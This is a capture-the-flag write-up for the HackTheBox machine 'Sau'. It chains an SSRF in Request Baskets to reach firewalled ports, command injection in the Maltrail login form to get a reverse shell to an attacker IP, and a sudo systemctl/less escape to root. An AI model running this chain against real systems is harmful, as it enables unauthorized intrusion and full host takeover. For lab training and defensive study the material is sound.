# Sau

**Platform:** HackTheBox
**OS:** Linux
**Tags:** CVE-2023-27163, SSRF, Request Baskets, Maltrail, Command Injection, sudo, RCE, Privilege Escalation
**Date:** 2026-06-18

Request Baskets 1.2.1 on port 55555 is vulnerable to SSRF (CVE-2023-27163). Crafted baskets proxy requests from the server's loopback, bypassing the external firewall on ports 80 and 8338. Forwarding through reveals Maltrail v0.53, which passes the login `username` field unsanitised into a shell command. Exploiting the injection gives a shell as `puma`. Root via `sudo systemctl status` invoking `less` as root, escaped with `!bash`.

## 1. Enumeration

Two open ports, two filtered. The filtered ones are the story.

```bash
nmap -sC -sV -p- 10.129.21.212
```

Findings:
- 22/tcp - OpenSSH 8.2p1 (Ubuntu)
- 80/tcp - filtered, HTTP (firewall drops external traffic)
- 8338/tcp - filtered, unknown service
- 55555/tcp - Request Baskets (Golang), redirects to `/web`

Ports 80 and 8338 are filtered. The firewall blocks them externally, but the machine can reach them via localhost. Port 55555 is Request Baskets, a webhook tool that lets you create HTTP endpoints and forward traffic wherever you want. That forward_url is the bug.

## 2. SSRF (CVE-2023-27163): Request Baskets

Request Baskets <= 1.2.1 allows unauthenticated users to create baskets with a configurable `forward_url`. Any request to the basket is proxied by the server to that URL. Because the server initiates the request from localhost, it bypasses the external firewall and can reach filtered internal ports.

Creating a basket that forwards to `127.0.0.1:80`:

```bash
./CVE-2023-27163.sh http://10.129.21.212:55555 http://127.0.0.1:80
```

The script creates the basket and returns a URL in the form `http://10.129.21.212:55555/<basket_name>`. Visiting that URL proxies the request through the server to `127.0.0.1:80`.

**Result:** Internal service on port 80 revealed: `Powered by Maltrail (v0.53)`.

## 3. Command Injection: Maltrail v0.53

Maltrail v0.53 passes the `username` field from the login endpoint directly to a shell command without sanitisation. An attacker can inject arbitrary OS commands by sending a crafted POST to `/login`, reached here through the SSRF basket.

Set up a listener, then run the exploit against the basket URL:

```bash
nc -lvnp 4444
```

```bash
python3 exploit.py <ATTACKER_IP> 4444 http://10.129.21.212:55555/<basket_name>
```

**Result:** Reverse shell as `puma`. User flag at `/home/puma/user.txt`.

## 4. Privilege Escalation

Checking sudo permissions as `puma`:

```bash
sudo -l
```

- NOPASSWD: `(ALL : ALL) /usr/bin/systemctl status trail.service`

`systemctl status` pipes its output through `less`. Since it runs under `sudo`, `less` is invoked as root. `less` allows arbitrary command execution via `!`.

```bash
sudo /usr/bin/systemctl status trail.service
```

Inside the pager, type:

```
!bash
```

**Result:** Root shell. Root flag at `/root/root.txt`.

## 5. Flags

- User: `redacted`
- Root: `redacted`
